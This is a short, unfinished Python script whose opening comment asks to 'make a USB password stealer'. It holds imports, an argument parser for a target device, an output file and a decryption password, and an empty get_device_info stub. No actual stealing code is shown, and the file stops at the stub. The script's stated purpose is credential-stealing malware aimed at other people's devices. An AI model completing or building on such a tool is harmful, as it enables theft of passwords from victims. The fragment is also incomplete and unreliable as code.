# make a USB password stealer in python


import os
import sys
import time
import subprocess
import re
import platform
import argparse
import getpass
import base64
import hashlib


def get_args():
    parser = argparse.ArgumentParser(description='USB Password Stealer')
    parser.add_argument('-d', '--device', help='Device to steal password from', required=True)
    parser.add_argument('-o', '--output', help='Output file', required=True)
    parser.add_argument('-p', '--password', help='Password to decrypt the output file', required=True)
    return parser.parse_args()


def get_device_info(device):
    